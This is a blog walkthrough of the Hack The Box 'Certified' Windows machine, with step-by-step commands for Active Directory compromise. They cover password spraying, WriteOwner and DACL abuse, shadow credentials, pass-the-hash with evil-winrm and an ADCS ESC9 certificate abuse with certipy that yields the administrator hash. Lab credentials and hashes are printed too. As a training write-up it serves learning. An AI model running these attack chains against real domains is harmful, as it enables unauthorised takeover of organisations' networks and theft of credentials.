---
title: "Certified Walkthrough(Hack The Box)"
date: 2025-03-15
draft: false
description: "A straight forward walkthrough for Certified hack the box machine"
tags: ["Medium", "Windows", "Hack The Box", "hacking", "Active Directory", "Walkthrough"]
 
---
## Reconnaissance  
- We got multiple ports open, Which is interesting 
![Pasted image 20250101141920.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101141920.png?raw=true)
- Out of curiosity I fired up a nmap scan and it turns out there are other ports open too
![Pasted image 20250101142533.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101142533.png?raw=true)
- For this box they gave credentials as well
- Username: `judith.mader` Password: `judith09`
- Total open ports:
```
Open 10.10.11.41:53
Open 10.10.11.41:88
Open 10.10.11.41:135
Open 10.10.11.41:139
Open 10.10.11.41:389
Open 10.10.11.41:445
Open 10.10.11.41:464
Open 10.10.11.41:593
Open 10.10.11.41:636
Open 10.10.11.41:3268
Open 10.10.11.41:3269
Open 10.10.11.41:5985
Open 10.10.11.41:9389
Open 10.10.11.41:49668
Open 10.10.11.41:49666
Open 10.10.11.41:49673
Open 10.10.11.41:49674
Open 10.10.11.41:49683
Open 10.10.11.41:49716
Open 10.10.11.41:49739
Open 10.10.11.41:59780
```
## Enumeration
- As usual for starters I checked the smb shares of user judith
```bash
netexec smb certified.htb -u judith.mader -p judith09 --shares
```
![Pasted image 20250101144435.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101144435.png?raw=true)
- Smb shares for this user, didn't had anything intersting.
- As usual I enumerated users from SMB 
```bash
netexec smb certified.htb -u judith.mader -p judith09 --rid-brute >> users-earlier.txt
```
- Removed the unnecessary fields from the netexec output
```bash
cat users-earlier.txt| grep "SidTypeUser" | cut -d '\' -f 2 | cut -d '(' -f 1 >> users.txt
```
![Pasted image 20250101155355.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101155355.png?raw=true)
- Then I testing for password reuse using password sprying attack
```bash
netexec smb certified.htb -u users.txt -p judith09 --continue-on-success
```
- Got nothing useful, seems It's not that easy
![Pasted image 20250101155625.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101155625.png?raw=true)
- Searched LDAP for anything interesting and found nothing
```bash
ldapsearch -H ldap://certified.htb -D 'judith.mader@certified.htb' -w 'judith09' -b "DC=certified,DC=htb" | grep "pass"
```
![Pasted image 20250101195514.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101195514.png?raw=true)
![nothing](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExN3RxM2I1MXcwcG5lcXNxZXlrNjdsbHB0dDlmNmF5MzY0aG90M3c3MSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/f6W3eijFZUIwiNY0xp/giphy.gif)
- So atlast I collected bloodhound data
```bash
bloodhound-python -c ALL -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41
```
![Pasted image 20250101195630.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101195630.png?raw=true)
- While analyzing the data I found Interesting things
- **These are my findings:**
- The user `Judith` has WriteOwner permissions over group `MANAGEMENT@CERTIFIED.Hack The Box`
- The group `Management@certified.htb` has Generic all permission over user `management_svc@certified.htb`
- The user `MANAGEMENT_SVC@CERTIFIED.Hack The Box` has CanPsRemote permission on the Domain controller(This is not quite useful. At the end we will be abusing AD CS instead of this)
![Pasted image 20250101202115.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101202115.png?raw=true)

## Exploitation
- Time is very crucial for these kind of attacks so synced the time with the target system
```bash
sudo rdate -n certified.htb
```
#### WriteOwner Abuse
- First we need to be an user of `MANAGEMENT@CERTIFIED.Hack The Box`
- Using this command, I can change the ownership of the object to the user which I own
```bash
owneredit.py -action write -new-owner 'judith.mader' -target 'Management' 'certified.htb/judith.mader:judith09'
```
![Pasted image 20250101212751.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101212751.png?raw=true)
- To abuse ownership of a group object, I need to grant myself the AddMember privilege. Impacket's dacledit can be used for this purpose
```bash
dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=Hack The Box' 'certified.htb/judith.mader:judith09'
```
![Pasted image 20250101212835.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101212835.png?raw=true)
- Now I can add the user to the group using `net` tool
```bash
net rpc group addmem "Management" "judith.mader" -U "certified.htb/judith.mader%judith09" -S "DC01.certified.htb"
```
![Pasted image 20250101213012.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101213012.png?raw=true)
- Now that the user `judith` has become member of the group `MANAGEMENT@CERTIFIED.Hack The Box` I can move to the next step
#### GenericWrite Abuse

{{< badge >}}
Definition
{{< /badge >}}
- The bottom line of `GenericWrite` is --> Generic Write Abuse is a type of attack in Active Directory (AD) where an attacker with GenericWrite permissions over an object (such as a user, group, or computer) can modify certain attributes of that object to escalate privileges, maintain persistence, or execute malicious commands.

- I can also change the password of the account but for me using Shadow Credentials Technique is optimal

{{< badge >}}
Definition
{{< /badge >}}
- Shadow Credentials Attack is a technique used by attackers to gain persistent access to an Active Directory (AD) environment by manipulating key authentication data. It involves exploiting the way AD handles alternative credentials such as key pairs or certificates associated with user or computer accounts.

{{< details summary="View links" >}} [Article-1](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials) <br> [Article-2](https://www.hackingarticles.in/shadow-credentials-attack/) {{< /details >}}

- Performing shadow credential attack:
```bash
pywhisker -d certified.htb -u judith.mader -p judith09 --target management_svc --action add
```
![Pasted image 20250101213236.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101213236.png?raw=true)
- Getting the TGT
```bash
python3 gettgtpkinit.py certified.htb/management_svc -cert-pfx 2QCAj1n0.pfx -pfx-pass AxYpGIRkSbtAKz4T0aJ4 management_svc.ccache
```
![Pasted image 20250101213528.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101213528.png?raw=true)
- Using the TGT cache to get the NT hash
```bash
KRB5CCNAME=../management_svc.ccache python3 getnthash.py certified.htb/management_svc -key 841420e74637606f21b9eaaec6a8bfd2cc98eff7fb5167daddb131f3127a96b0
```
![Pasted image 20250101213938.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101213938.png?raw=true)
- Now that I got the hash passing it to login in EvilwinRm as user `management_svc`
```bash
evil-winrm -u management_svc -H a091c1832bcdd46<SNIP> -i certified.htb
```
- Got access as user `management_svc`
- Got the {{< keyword >}} User flag {{< /keyword >}}
![Pasted image 20250101214048.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101214048.png?raw=true)
![We-got-more](https://media1.tenor.com/m/LgfEAwXpSCcAAAAC/job-aint-done-yet-jidon-adams.gif)

## Privilege Escalation
- As the machine name suggests, Lets enumerate AD CS using [certipy](https://github.com/ly4k/Certipy) tool
- In case if you haven't heard about this tool, [Certipy](https://github.com/ly4k/Certipy) is an offensive tool for enumerating and abusing Active Directory Certificate Services(AD CS). 
- Certipy can be easily installed using python
```bash
pip3 install certipy-ad
```
- or using pipx
```bash
pipx install certipy-ad
```
- On using certipy I came to know that user `ca_operators` has esc9 vulnerability
```bash
certipy find -u management_svc -hashes a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.10.11.41 -vulnerable -enabled -old-bloodhound

```
- ![Pasted image 20250101224245.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101224245.png?raw=true)
#### Abusing the AD CS 
{{< alert icon="circle-info" >}}
 Note: This requires perfect time coordination and each command execution intervel should not exceed two minutes before executing next command 
{{< /alert >}}

- Lets perform shadow credentials on user `ca_operators` from `management_svc` user, since I have `GenericAll` DACL over it.
- Using shadow technique I got the hash of user `ca_operator`  
```bash
certipy shadow auto -u management_svc@certified.htb -hashes <hashes> -account ca_operator
```
![Pasted image 20250102060054.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250102060054.png?raw=true)
- I changed the user principal to administrator
```bash
certipy account update -u management_svc@certified.htb -hashes <hash> -user ca_operator -upn administrator
```
![Pasted image 20250102011822.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250102011822.png?raw=true)
- Now abuse the template to get administrator pfx
```bash
certipy req -username ca_operator@certified.htb -hashes <hash> -ca certified-DC01-CA -template CertifiedAuthentication
```
![Pasted image 20250102012113.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250102012113.png?raw=true)
{{< alert icon="circle-info" >}} Note: This above step was failing for me with throwing `Netbios timeout` error. When it worked, It gave me the pfx of user `ca_operator`, for a weird reason when I redo all the steps from step one it worked. {{< /alert >}}
- Now I Changed the user principal back to the same
```bash
certipy account update -u management_svc@certified.htb -hashes <hash> -user ca_operator -upn ca_operator@certified.htb
```
- I easily got the administrator NTLM hash from using this command with `administrator.pfx`
```bash
certipy auth -pfx administrator.pfx -domain certified.htb
```
![Pasted image 20250102012703.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250102012703.png?raw=true)
- Then I logged in with Administrator user's NT part of the hash
```bash
evil-winrm -u administrator -H <hash> -i certified.htb
```
- Got the {{< keyword >}} Root flag {{< /keyword >}}
![Pasted image 20250102012907.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250102012907.png?raw=true)

{{< typeit >}} This was a fun box I personally learnt a lot from this box. I hope you enjoyed my walkthrough, Until nextime..... {{< /typeit >}} 

![End](https://media1.tenor.com/m/c2h1smWX3JAAAAAC/talk-to-you-later-ttyl-ttyl-talk-to-you-later.gif)
